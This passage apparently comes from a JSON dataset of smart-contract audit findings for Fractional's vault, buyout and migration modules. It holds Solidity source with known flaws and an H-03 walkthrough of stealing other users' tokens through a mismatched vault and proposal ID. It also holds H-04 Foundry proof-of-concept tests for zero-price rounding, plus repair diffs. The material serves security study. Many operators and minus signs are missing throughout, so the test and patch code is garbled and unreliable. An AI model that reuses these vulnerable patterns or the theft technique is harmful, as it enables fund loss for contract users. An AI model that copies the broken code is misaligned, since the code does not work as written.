migrationInfo[_vault][_proposalId].fractionsMigrated = true;\n        // Emits event for minting fractional tokens for the new vault\n        emit FractionsMigrated(\n            _vault,\n            proposal.newVault,\n            _proposalId,\n            proposal.newFractionSupply\n        );\n    }\n\n    /// @notice Retrieves ether and fractions deposited from an unsuccessful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the failed proposal\n    function withdrawContribution(address _vault, uint256 _proposalId)\n        external\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if caller has no fractional balance to withdraw\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (\n            current != State.INACTIVE ||\n            migrationInfo[_vault][_proposalId].newVault != address(0)\n        ) revert NoContributionToWithdraw();\n\n        // Temporarily store user's fractions for the transfer\n        uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n        // Updates fractional balance of caller\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Withdraws fractional tokens from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            userFractions,\n            \"\"\n        );\n\n        // Temporarily store user's eth for the transfer\n        uint256 userEth = userProposalEth[_proposalId][msg.sender];\n        // Udpates ether balance of caller\n        userProposalEth[_proposalId][msg.sender] = 0;\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(userEth);\n    }\n\n    /// @notice Migrates an ERC-20 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-20 token\n    /// @param _amount Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-20 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC20(\n            _vault,\n            _token,\n            newVault,\n            _amount,\n            _erc20TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-721 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-721 token\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC721(\n            _vault,\n            _token,\n            newVault,\n            _tokenId,\n            _erc721TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-1155 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _id ID of the token\n    /// @param _amount amount to be transferred\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function migrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _id,\n        uint256 _amount,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-1155 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _id,\n            _amount,\n            _erc1155TransferProof\n        );\n    }\n\n    /// @notice Batch migrates multiple ERC-1155 tokens to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _ids IDs of each token type\n    /// @param _amounts Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for batch transferring multiple ERC-1155 tokens\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256[] calldata _ids,\n        uint256[] calldata _amounts,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Batch withdraws multiple ERC-1155 tokens from the old vault and transfers to the new vault\n        IBuyout(buyout).batchWithdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _ids,\n            _amounts,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Migrates the caller's fractions from an old vault to a new one after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    function migrateFractions(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not successful\n        (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        State required = State.SUCCESS;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if proposer of buyout is not this contract\n        if (proposer != address(this)) revert NotProposalBuyout();\n\n        // Gets the last total supply of fractions for the vault\n        (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        // Calculates the total ether amount of a successful proposal\n        uint256 totalInEth = _calculateTotal(\n            1 ether,\n            lastTotalSupply,\n            migrationInfo[_vault][_proposalId].totalEth,\n            migrationInfo[_vault][_proposalId].totalFractions\n        );\n        // Calculates balance of caller based on ether contribution\n        uint256 balanceContributedInEth = _calculateContribution(\n            totalInEth,\n            lastTotalSupply,\n            userProposalEth[_proposalId][msg.sender],\n            userProposalFractions[_proposalId][msg.sender]\n        );\n\n        // Gets the token and fraction ID of the new vault\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        (address token, uint256 newFractionId) = IVaultRegistry(registry)\n            .vaultToToken(newVault);\n        // Calculates share amount of fractions for the new vault based on the new total supply\n        uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);\n        uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /\n            totalInEth;\n\n        // Transfers fractional tokens to caller based on share amount\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            newFractionId,\n            shareAmount,\n            \"\"\n        );\n    }\n\n    /// @notice Generates the merkle tree of a given proposal\n    /// @param _modules List of module contracts\n    /// @return hashes Combined list of leaf nodes\n    function generateMerkleTree(address[] memory _modules)\n        public\n        view\n        returns (bytes32[] memory hashes)\n    {\n        uint256 treeLength;\n        uint256 modulesLength = _modules.length;\n\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                treeLength += IModule(_modules[i]).getLeafNodes().length;\n            }\n        }\n\n        uint256 counter;\n        hashes = new bytes32[](treeLength);\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();\n                uint256 leavesLength = leaves.length;\n                for (uint256 j; j < leavesLength; ++j) {\n                    hashes[counter++] = leaves[j];\n                }\n            }\n        }\n    }\n\n    /// @notice Calculates the total amount of ether\n    /// @param _scalar Scalar used for multiplication\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _totalEth Total ether balance of the proposal\n    /// @param _totalFractions Total fractional balance of the proposal\n    /// @return Total amount of ether\n    function _calculateTotal(\n        uint256 _scalar,\n        uint256 _lastTotalSupply,\n        uint256 _totalEth,\n        uint256 _totalFractions\n    ) private pure returns (uint256) {\n        return\n            (_totalEth * _scalar) /\n            (_scalar - ((_totalFractions * _scalar) / _lastTotalSupply));\n    }\n\n    /// @notice Calculates the amount of ether contributed by the user\n    /// @param _totalInEth Total amount of ether\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _userProposalEth User balance of ether for the proposal\n    /// @param _userProposalFractions User balance of fractions for the proposal\n    /// @return Total contribution amount\n    function _calculateContribution(\n        uint256 _totalInEth,\n        uint256 _lastTotalSupply,\n        uint256 _userProposalEth,\n        uint256 _userProposalFractions\n    ) private pure returns (uint256) {\n        return\n            _userProposalEth +\n            (_userProposalFractions * _totalInEth) /\n            _lastTotalSupply;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n",
        "CodeNames": [
            "FERC1155.sol",
            "Migration.sol",
            "IMigration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "leave",
                    "migrationInfo[_vault][_proposalId]",
                    "join",
                    "proposalId",
                    "vault"
                ],
                "Type": " Migration: no check that user-supplied  proposalId  and  vault  match",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L111\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L143\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L157\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L164\n\n\nIn Migration, when joining or leaving a migration proposal, Fractional does not check whether the user supplied proposalId and vault match the actual vault that the proposal belongs to.\n\nThis allows the user to trick the accounting.\n\n\nLoss of funds for users.\n\nMalicious users can withdraw tokens from proposals which have not been committed yet.\n\n\nLet's say Vault A's FERC1155 token is called TOKEN.\nAlice has deposited 100 TOKEN in Migration to Vault A on proposal ID 1.\n\nNow Malaclypse creates Vault B with token ERIS as FERC1155 and mints 100 tokens to himself.\nHe then calls Migration's join with amount as 100, Vault B as vault, proposal ID as 1.\nThe function will get(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L111) ERIS as the token to deposit.\nIt will pull(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L126) the ERIS from Mal.\nAnd now for the problem it will set(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L135) the following variable:\n\n            userProposalFractions[_proposalId][msg.sender] += _amount;\n\nNotice that this does not correspond to the vault number.\n\nNow, Mal will call the leave function, this time with Vault A address and proposal ID 1.\nThe function will get(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L143) the token to send from the vault as TOKEN.\n\nIt will get(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L155) the amount to withdraw from userProposalFractions[_proposalId][msg.sender], which as we saw previously will be 100.\n\nIt will deduct(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L156) this amount from migrationInfo[_vault][_proposalId], which won't revert as Alice deposited 100 to this vault and proposal.\n\nAnd finally it will send(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L164) 100 TOKENs to Mal although he deposited ERIS.\n\nMal received Alice's valuable tokens.\n\n",
                "Repair": "\nI think that one option would be to save for each proposal which vault it corresponds to.\nThen you can verify that user supplies a matching vault-proposal pair, or he can even just supply proposal and the contract will get the vault from that.\n\nAnother solution would be to have userProposalFractions save the relevant vault also, not just a general proposal id.\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/208) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/326#issuecomment-1198654944):\n  The warden's POC shows how an attacker can effectively steal tokens by creating a migration for a new vault with worthless tokens and reusing an existing proposalId, then withdrawing valuable tokens from the original proposal. I agree this is a High risk issue.\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\n\n    // add Eve to the list of users \n    function setUp() public {\n        setUpContract();\n        alice = setUpUser(111, 1);\n        bob = setUpUser(222, 2);\n        eve = setUpUser(333, 3);\n\n        vm.label(address(this), \"BuyoutTest\");\n        vm.label(alice.addr, \"Alice\");\n        vm.label(bob.addr, \"Bob\");\n        vm.label(eve.addr, \"Eve\");\n    }\n\n    ///////////////////////////////////\n\n    // a scenario where the price is zero, and the proposer ends up loosing all his fractions \n    function test_bugFractionPriceIsZero() public{\n        uint totalSupply = 21e17;\n        uint BOB_INITIAL_BALANCE = totalSupply / 2;\n        initializeBuyout(alice, bob, totalSupply, BOB_INITIAL_BALANCE, true);\n\n        // Bob starts a buyout with 1 ether for the other half of total fractions\n        bob.buyoutModule.start{value: 1 ether}(vault);\n\n        eve.buyoutModule.buyFractions{value: 0}(vault, BOB_INITIAL_BALANCE);\n\n        // Eve got all Bob's fractions for the very tempting price of 0\n        assertEq(getFractionBalance(eve.addr), BOB_INITIAL_BALANCE);\n    }\n\n\n    ////////////////////////////////\n\n    // a scenario where the price is 1, and the fraction price ends up being \n    // 50% of intended price.\n    // The user who cashes his fractions after the sale gets the difference (0.9 ether in this case).\n    function test_bugFractionPriceIsOne() public{\n        uint totalSupply = 11e17;\n        uint BOB_INITIAL_BALANCE = totalSupply / 10;\n        initializeBuyout(alice, bob, totalSupply, BOB_INITIAL_BALANCE, true);\n\n        uint aliceFractionBalance =  totalSupply * 9 / 10;\n        uint256 buyoutPrice = 2 ether;\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n        assertEq(fractionPrice, 1);\n\n        // We need to approve the buyout even though Eve doesn't hold any fractions\n        eve.ferc1155 = new FERC1155BS(address(0), 333, token);\n        setApproval(eve, buyout, true);\n\n        eve.buyoutModule.start{value: buyoutPrice}(vault);\n        // alice selling all her fractions\n        alice.buyoutModule.sellFractions(vault, aliceFractionBalance);\n\n        // 4 days till buyout ends\n        vm.warp(block.timestamp + 4.1 days);\n\n        bob.buyoutModule.end(vault, burnProof);\n\n        bob.buyoutModule.cash(vault, burnProof);\n\n        // Alice revenue should be about 0.99 ether\n        uint256 aliceExpectedETHRevenue = fractionPrice * aliceFractionBalance;\n        // Bob revenue should be about 1.01 ether\n        uint256 bobExpectedETHRevenue = buyoutPrice aliceExpectedETHRevenue;\n\n        // Bob earned more than Alice even though Alice had 9 times his fractions\n        // This means Bob got ~9 times ETH per fraction than Alice\n        assertTrue(bobExpectedETHRevenue  aliceExpectedETHRevenue);\n        \n        // Just make sure they have the expected balance\n        assertEq(getETHBalance(alice.addr), aliceExpectedETHRevenue + INITIAL_BALANCE);\n        assertEq(getETHBalance(bob.addr), bobExpectedETHRevenue + INITIAL_BALANCE);\n\n    }\n"
                ],
                "Type": " Division rounding can make fraction-price lower than intended (down to zero)",
                "Description": "\nDivisions in EVM are rounded down, which means when the fraction price is close to 1 (e.g. 0.999) it would effectively be zero, when it's close to 2 (1.999) it would be rounded to 1 losing close to 50% of the intended price.\n\n*   In case the proposer had any fractions, the buyout module puts them for sale and he can lose his fractions while getting in exchange either zero or a significantly lower price than intended\n*   Even when the proposer doesn't hold any fractions, if the buyout succeeds the difference (i.e. buyoutPrice fractionPrice*totalSupply) goes to those who cash out their fractions after the buyout ends.\n    *   That's going to disincentivize users to sell their fractions during the buyout, because they may get more if they keep it till the buyout ends.\n    *   In other words, not only that the extra money the proposer paid doesn't increase the chance of the buyout to succeed, it actually decreases it.\n\n\nI've added the following tests to test/Buyout.t.sol.\n\nsolidity\n\n    // add Eve to the list of users \n    function setUp() public {\n        setUpContract();\n        alice = setUpUser(111, 1);\n        bob = setUpUser(222, 2);\n        eve = setUpUser(333, 3);\n\n        vm.label(address(this), \"BuyoutTest\");\n        vm.label(alice.addr, \"Alice\");\n        vm.label(bob.addr, \"Bob\");\n        vm.label(eve.addr, \"Eve\");\n    }\n\n    ///////////////////////////////////\n\n    // a scenario where the price is zero, and the proposer ends up loosing all his fractions \n    function test_bugFractionPriceIsZero() public{\n        uint totalSupply = 21e17;\n        uint BOB_INITIAL_BALANCE = totalSupply / 2;\n        initializeBuyout(alice, bob, totalSupply, BOB_INITIAL_BALANCE, true);\n\n        // Bob starts a buyout with 1 ether for the other half of total fractions\n        bob.buyoutModule.start{value: 1 ether}(vault);\n\n        eve.buyoutModule.buyFractions{value: 0}(vault, BOB_INITIAL_BALANCE);\n\n        // Eve got all Bob's fractions for the very tempting price of 0\n        assertEq(getFractionBalance(eve.addr), BOB_INITIAL_BALANCE);\n    }\n\n\n    ////////////////////////////////\n\n    // a scenario where the price is 1, and the fraction price ends up being \n    // 50% of intended price.\n    // The user who cashes his fractions after the sale gets the difference (0.9 ether in this case).\n    function test_bugFractionPriceIsOne() public{\n        uint totalSupply = 11e17;\n        uint BOB_INITIAL_BALANCE = totalSupply / 10;\n        initializeBuyout(alice, bob, totalSupply, BOB_INITIAL_BALANCE, true);\n\n        uint aliceFractionBalance =  totalSupply * 9 / 10;\n        uint256 buyoutPrice = 2 ether;\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n        assertEq(fractionPrice, 1);\n\n        // We need to approve the buyout even though Eve doesn't hold any fractions\n        eve.ferc1155 = new FERC1155BS(address(0), 333, token);\n        setApproval(eve, buyout, true);\n\n        eve.buyoutModule.start{value: buyoutPrice}(vault);\n        // alice selling all her fractions\n        alice.buyoutModule.sellFractions(vault, aliceFractionBalance);\n\n        // 4 days till buyout ends\n        vm.warp(block.timestamp + 4.1 days);\n\n        bob.buyoutModule.end(vault, burnProof);\n\n        bob.buyoutModule.cash(vault, burnProof);\n\n        // Alice revenue should be about 0.99 ether\n        uint256 aliceExpectedETHRevenue = fractionPrice * aliceFractionBalance;\n        // Bob revenue should be about 1.01 ether\n        uint256 bobExpectedETHRevenue = buyoutPrice aliceExpectedETHRevenue;\n\n        // Bob earned more than Alice even though Alice had 9 times his fractions\n        // This means Bob got ~9 times ETH per fraction than Alice\n        assertTrue(bobExpectedETHRevenue  aliceExpectedETHRevenue);\n        \n        // Just make sure they have the expected balance\n        assertEq(getETHBalance(alice.addr), aliceExpectedETHRevenue + INITIAL_BALANCE);\n        assertEq(getETHBalance(bob.addr), bobExpectedETHRevenue + INITIAL_BALANCE);\n\n    }\n\n\n\nFoundry\n\n",
                "Repair": "\n#### Solution A: make sure buyoutPrice = fractionPrice * totalSupply\n\n*   Request the user to send the intended fraction price (as a function arg) and then make sure he sent enough ETH. This way the user is well aware of the fraction price.\n*   An advantage of this method is that the buyout price calculation is also more accurate (compared to (msg.value * 100) /(100 ((depositAmount * 100) / totalSupply)) which has a rounding of up to 1%)\n*   Optional you can also refund the user if he sent too much ETH, though this is probably unnecessary since the UI should calculate the exact amount the user should send.\n\nProposed code for solution A:\n\ndiff\n     /// @param _vault Address of the vault\n   function start(address _vault) external payable {\n+    function start(address _vault, uint256 _fractionPrice) external payable {\n         // Reverts if ether deposit amount is zero\n         if (msg.value == 0) revert ZeroDeposit();\n         // Reverts if address is not a registered vault\n@@ -66,6 +66,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n         (, , State current, , , ) = this.buyoutInfo(_vault);\n         State required = State.INACTIVE;\n         if (current != required) revert InvalidState(required, current);\n+        if (fractionPrice == 0) revert ZeroFractionPrice();\n \n@@ -83,9 +84,10 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n \n         // Calculates price of buyout and fractions\n         // @dev Reverts with division error if called with total supply of tokens\n       uint256 buyoutPrice = (msg.value * 100) /\n           (100 ((depositAmount * 100) / totalSupply));\n       uint256 fractionPrice = buyoutPrice / totalSupply;\n+        uint256 fractionPrice = _fractionPrice;\n+        uint256 buyoutPrice = fractionPrice * totalSupply;\n+        uint256 requiredEth = fractionPrice * (totalSupply depositAmount);\n+        if (msg.value != requiredEth) revert InvalidPayment();\n \n         // Sets info mapping of the vault address to auction struct\n\n\n#### Solution B: Calculate the price at buy/sell time using buyoutPrice\n\n*   The problem with solution A is that it doesn't let much flexibility in case that total supply is large. In the example in the PoC (totalSupply = 2.1e18) the buyout price can be either 2.1 ETH or 4.2 ETH, if the user wants to offer 1.5 ETH or 3 ETH he can't do it.\n*   This solution solves this instead of basing the buy/sell price on the fraction price use the buyout price to calculate the buy/sell price.\n*   This would cause a slight differential price (buying 1K fractions would have a slightly different price than 1M fractions).\n    *   However, note that the rounding here is probably insignificant, since the rounding would be no more than 1 wei per buy/sell\n    *   Also, the more the users buy/sell the more accurate the price would be (the less you buy the more you'll pay, the less you sell the less you'd get).\n*   For selling just calculate  price = (buyoutPrice * amount) / totalSupply\n*   For buying do the same, just add 1 wei if there was any rounding (see code below)\n*   If you're worried about the rounding of the buyout price (compared to solution A), you can increase the coefficient (this doesn't cost any extra gas, and is nearly impossible to overflow):\n\n(ethDeposit * 1e6) / (1e6 ((fractionDeposit * 1e6) / totalSupply))\n\nProposed code for solution B:\n\ndiff\n--a/src/interfaces/IBuyout.sol\n+++ b/src/interfaces/IBuyout.sol\n@@ -20,7 +20,7 @@ struct Auction {\n     // Enum state of the buyout auction\n     State state;\n     // Price of fractional tokens\n   uint256 fractionPrice;\n+    uint256 buyoutPrice;\n     // Balance of ether in buyout pool\n     uint256 ethBalance;\n     // Total supply recorded before a buyout started\n\n\n--a/src/modules/Buyout.sol\n+++ b/src/modules/Buyout.sol\n@@ -85,14 +85,14 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n         // @dev Reverts with division error if called with total supply of tokens\n         uint256 buyoutPrice = (msg.value * 100) /\n             (100 ((depositAmount * 100) / totalSupply));\n       uint256 fractionPrice = buyoutPrice / totalSupply;\n+        uint256 estimatedFractionPrice = buyoutPrice / totalSupply;\n \n         // Sets info mapping of the vault address to auction struct\n         buyoutInfo[_vault] = Auction(\n             block.timestamp,\n             msg.sender,\n             State.LIVE,\n           fractionPrice,\n+ // replace fraction price with buyout price in the Auction struct\n+            buyoutPrice,\n             msg.value,\n             totalSupply\n         );\n@@ -102,7 +102,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n             msg.sender,\n             block.timestamp,\n             buyoutPrice,\n           fractionPrice\n+            estimatedFractionPrice\n         );\n     }\n \n@@ -115,7 +115,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n             _vault\n         );\n         if (id == 0) revert NotVault(_vault);\n       (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n+        (uint256 startTime, , State current, uint256 buyoutPrice, , uint256 totalSupply ) = this\n             .buyoutInfo(_vault);\n         // Reverts if auction state is not live\n         State required = State.LIVE;\n@@ -135,7 +135,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n         );\n \n         // Updates ether balance of pool\n       uint256 ethAmount = fractionPrice * _amount;\n+        uint256 ethAmount = buyoutPrice * _amount / totalSupply;\n         buyoutInfo[_vault].ethBalance -= ethAmount;\n         // Transfers ether amount to caller\n         _sendEthOrWeth(msg.sender, ethAmount);\n@@ -153,7 +153,7 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n         );\n         if (id == 0) revert NotVault(_vault);\n         // Reverts if auction state is not live\n       (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n+        (uint256 startTime, , State current, uint256 buyoutPrice, , uint256 totalSupply ) = this\n             .buyoutInfo(_vault);\n         State required = State.LIVE;\n         if (current != required) revert InvalidState(required, current);\n@@ -161,8 +161,13 @@ contract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n         uint256 endTime = startTime + REJECTION_PERIOD;\n         if (block.timestamp  endTime)\n             revert TimeExpired(block.timestamp, endTime);\n+\n+        uint256 price = (buyoutPrice * _amount) / totalSupply;\n+        if (price * totalSupply < buyoutPrice * _amount){\n+            price++;\n+        }\n         // Reverts if payment amount does not equal price of fractional amount\n       if (msg.value != fractionPrice * _amount) revert InvalidPayment();\n+        if (msg.value != price) revert InvalidPayment();\n \n         // Transfers fractional tokens to caller\n         IERC1155(token).safeTransferFrom(\n\n\n\n\nHardlyDifficult (judge) increased severity to High and commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/310#issuecomment-1201840359):\n  Rounding impacting fractionPrice can significantly impact other math in this module. I think this is a High risk issue, given the right circumstances such as the example above where the buy price becomes zero, assets are compromised.\n \n Selecting this instance as the primary issue for including test code and the detailed recs.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout 